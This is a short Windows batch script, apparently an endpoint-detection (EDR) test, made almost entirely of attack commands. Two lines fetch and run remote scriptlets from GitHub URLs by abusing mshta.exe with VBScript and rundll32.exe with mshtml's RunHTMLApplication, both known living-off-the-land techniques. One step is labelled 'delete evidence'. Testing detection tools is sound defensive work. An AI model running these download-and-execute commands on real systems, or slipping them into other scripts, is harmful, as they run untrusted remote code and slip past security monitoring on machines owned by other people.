echo EDR test powershell activity
mshta.exe vbscript:Close(Execute("GetObject(""script:https://github.com/srmstest/testdetection/blob/main/edrtest2-POV.bat"")"))
timeout 5
echo EDR test delete evidence
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest3-POV").Exec();close()
